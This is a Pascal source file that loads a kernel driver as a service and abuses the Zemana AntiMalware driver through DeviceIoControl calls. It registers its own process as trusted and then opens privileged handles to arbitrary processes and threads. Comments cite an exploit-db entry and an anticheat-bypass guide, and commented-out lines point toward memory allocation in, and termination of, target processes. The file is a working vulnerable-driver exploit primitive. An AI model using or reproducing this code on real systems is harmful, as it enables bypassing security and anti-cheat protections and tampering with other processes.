program memRW;

uses windows,sysutils;

type NTSTATUS = integer;

OBJECT_INFORMATION_CLASS = (ObjectBasicInformation,ObjectNameInformation,ObjectTypeInformation,ObjectAllTypesInformation,ObjectHandleInformation );

UNICODE_STRING=packed record
         Length       :Word;
         MaximumLength:Word;
         Buffer       :PWideChar;
      end;

      OBJECT_NAME_INFORMATION=UNICODE_STRING;

      OBJECT_BASIC_INFORMATION = record
               Attributes:ULONG;
               GrantedAccess:ACCESS_MASK;
               HandleCount:ULONG;
               PointerCount:ULONG;
               PagedPoolUsage: ULONG;
                   NonPagedPoolUsage: ULONG;
                   Reserved: array[0..2] of ULONG;
                   NameInformationLength: ULONG;
                   TypeInformationLength: ULONG;
                   SecurityDescriptorLength: ULONG;
                   CreateTime: LARGE_INTEGER;
                 end;

function NtSuspendProcess(ProcessID:Dword):DWORD; stdcall;external 'ntdll.dll';
function NtGetNextThread(
        ProcessHandle:thandle;
        ThreadHandle:thandle;
        DesiredAccess:ACCESS_MASK;
        HandleAttributes:ulong;
        Flags:ulong;
        var NewThreadHandle:thandle
       ):NTSTATUS;stdcall;external 'ntdll.dll';
function GetThreadId(thread:thandle):NTSTATUS;stdcall;external 'kernel32.dll';
function NtQueryObject(ObjectHandle:cardinal; ObjectInformationClass:OBJECT_INFORMATION_CLASS; ObjectInformation:pointer; Length:ULONG;ResultLength:PDWORD):THandle;stdcall;external 'ntdll.dll';

var
         svc:thandle=thandle(-1);
         b:boolean;
         process:handle=thandle(-1);
         dup:thandle=thandle(-1);
         ptr:lpvoid ;
         written:ptruint;
         dw:dword;
         obi:OBJECT_BASIC_INFORMATION;



function LoadDriver(szDriverPath:string;szDriverSvc  :string= '_driver'):boolean;
var
  ServiceMan   :SC_HANDLE= thandle(-1);
  ServicePtr  :SC_HANDLE= thandle(-1);
  boolRetVal  :BOOL = FALSE;

begin

  //szDriverSvc = ExtractService(szDriverPath);
  ServiceMan  := OpenSCManager(nil, nil, SC_MANAGER_CREATE_SERVICE);
  if ServiceMan <> thandle(-1) then
    begin
    ServicePtr := CreateServiceA(ServiceMan, pchar(szDriverSvc), pchar(szDriverSvc),
		    SERVICE_START or SERVICE_DELETE or SERVICE_STOP,
		    SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
		    SERVICE_ERROR_IGNORE, pchar(szDriverPath), nil,nil, nil, nil, nil);
    if ServicePtr <>thandle(-1) then
      begin
	writeln('registered service successfully: '+szDriverSvc);
	if  StartService(ServicePtr, 0, nil) = TRUE then
          begin
		writeln('started service successfully');
		boolRetVal := TRUE;
          end //StartService
          else writeln('LoadDriver(StartService): GetLastError() -> '+ inttostr(GetLastError));
	CloseServiceHandle(ServicePtr);
      end //if ServicePtr <>thandle(-1) then
     else writeln('LoadDriver(CreateServiceA): GetLastError() ->  '+ inttostr(GetLastError));
    CloseServiceHandle(ServiceMan);
  end; //if ServiceMan <> thandle(-1) then
  result:= boolRetVal;
end;

function UnloadDriver(szDriverSvc  :string= '_driver'):boolean;
var
  //szDriverSvc  :string= 'zam';
  ServiceMan   :SC_HANDLE= thandle(-1);
  ServicePtr  :SC_HANDLE= thandle(-1);
  boolRetVal  :BOOL = FALSE;
  ServiceStat  :SERVICE_STATUS ;

begin
  fillchar(ServiceStat,sizeof(ServiceStat),0);
  ServiceMan  := OpenSCManager(nil, nil, SC_MANAGER_CREATE_SERVICE);
  if ServiceMan <> thandle(-1) then
    begin
	ServicePtr := OpenServiceA(ServiceMan, pchar(szDriverSvc), SERVICE_STOP or SERVICE_DELETE);
	if ( ServicePtr <> thandle(-1) ) then
        begin
		ControlService(ServicePtr, SERVICE_CONTROL_STOP, @ServiceStat);
		if  DeleteService(ServicePtr) <> TRUE
                    then  writeln('failed to delete service, cleanup manually!')
		    else  writeln('deleted service successfully: '+szDriverSvc);
		CloseServiceHandle(ServicePtr);
		boolRetVal := TRUE;

        end;//if ( ServicePtr <> thandle(-1) ) then
	CloseServiceHandle(ServiceMan);

 end; //if ServiceMan <> thandle(-1) then
  result:= boolRetVal;
end;

function ZemanaOpenHandle(filename:string):thandle;
begin
	result:= CreateFileA(pchar(filename),GENERIC_READ or GENERIC_WRITE,
		0, nil, OPEN_EXISTING,	FILE_ATTRIBUTE_NORMAL, 0);
end;

function ZemanaRegisterProcess(hDevice:thandle;TrustedProcess:dword ):boolean;
var
	 ReturnedSize:DWORD = 0;
begin
	result:= DeviceIoControl(hDevice,
			       $80002010,
			       @TrustedProcess,
			       sizeof(DWORD),
			       nil,
			       0,
			       @ReturnedSize,
			       nil);
end;

function ZemanaOpenProcess(hDevice:thandle;ProcessNumber:DWORD;ProcessHandle:PHANDLE ):boolean;
var
	 ReturnedSize:DWORD = 0;
begin
	result:= DeviceIoControl(hDevice,
                               $8000204C,
                               @ProcessNumber,
                               sizeof(DWORD),
                               ProcessHandle,
                               sizeof(HANDLE),
			       @ReturnedSize,
			       nil);
end;

function ZemanaOpenThread(hDevice:thandle;ThreadId:DWORD;ThreadHandle:PHANDLE  ):boolean;
var
	 ReturnedSize:DWORD = 0;
begin
	result:= DeviceIoControl(hDevice,
			       $80002084,
			       @ThreadId,
			       sizeof(DWORD),
			       ThreadHandle,
                               sizeof(HANDLE),
			       @ReturnedSize,
			       nil);
end;

function GetNextThread(process_handle:thandle):boolean;
var
newth,th:thandle;
ret:NTSTATUS;
start,teb:dword;
tid:dword;
begin
newth:=thandle(-1);
result:=false;
//https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms686769(v=vs.85).aspx
//THREAD_ALL_ACCESS
ret:=NtGetNextThread(process_handle ,0,MAXIMUM_ALLOWED,0,0,newth); //THREAD_ALL_ACCESS  THREAD_QUERY_INFORMATION
//if ret<>0 then writeln(inttohex(ret,sizeof(ret)));
if ret<>0 then exit;
//0x8000001A STATUS_NO_MORE_ENTRIES
while ret=0 do
begin
//log(inttostr(ret)+','+inttostr(GetThreadId(th)));
tid :=GetThreadId(newth);
//GetThreadInfo(process_handle,newth,start,teb);
writeln('tid:'+inttostr(tid));
th:=newth;
ret:=ntGetNextThread(
                   process_handle,
                   th,
                   MAXIMUM_ALLOWED, //THREAD_ALL_ACCESS THREAD_QUERY_INFORMATION
                   0,
                   0,
                   newth  //newth
                   );
closehandle(th); //avoid handle leaking
end;
result:=true;
end;

//https://guidedhacking.com/threads/how-to-bypass-kernel-anticheat-develop-drivers.11325/
begin
if paramcount=0 then exit;
if paramstr(1)='load'
   then LoadDriver (ParamStr (2),stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[]));
if paramstr(1)='unload'
   then UnloadDriver(stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[])) ;
if paramstr(1)='open' then
  begin
  //open handle
  svc:=ZemanaOpenHandle('\\.\ZemanaAntiMalware');
  if svc=thandle(-1) then begin writeln('handle failed');exit;end;
  //register process
  b:=ZemanaRegisterProcess(svc,GetCurrentProcessId );
  writeln('ZemanaRegisterProcess:'+BoolToStr (b));
  //open process
  b:=ZemanaOpenProcess(svc,strtoint(paramstr(2)),@process);
  //process:=OpenProcess (MAXIMUM_ALLOWED ,false,strtoint(paramstr(2)));
  writeln('OpenProcess:'+BoolToStr (b));
  writeln('process:'+inttostr(process));
  ptr:=nil;
  //https://www.exploit-db.com/exploits/43987
  //ptr := VirtualAllocEx(Process, nil, $1000, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);
  //writeln(inttohex(nativeuint(ptr),sizeof(lpvoid)));

  //https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
  dw:=0;
  if NtQueryObject(process, ObjectBasicInformation, @obi, sizeof(obi), @dw)=0
      then writeln('access_mask:'+inttohex(obi.GrantedAccess,sizeof(access_mask) ))
      else writeln('lasterror:'+inttostr(getlasterror));
  {
  b:=DuplicateHandle (process ,process,GetCurrentProcess ,@dup,PROCESS_ALL_ACCESS ,false,0); //$1FFFFF
  writeln('DuplicateHandle:'+BoolToStr (b));
  if NtQueryObject(dup, ObjectBasicInformation, @obi, sizeof(obi), @dw)=0
      then writeln('access_mask:'+inttohex(obi.GrantedAccess,sizeof(access_mask) ))
      else writeln('lasterror:'+inttostr(getlasterror));
  }
  //writeln('TerminateProcess:'+BoolToStr (TerminateProcess (dup,0)));
  if process<>thandle(-1) then writeln('GetNextThread:'+BoolToStr(GetNextThread (process )));
  if process<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(process)));
  if dup<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(dup)));
  if svc<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(svc)));
  //writeln(BoolToStr (TerminateProcess (process,0)));
  end;
end.

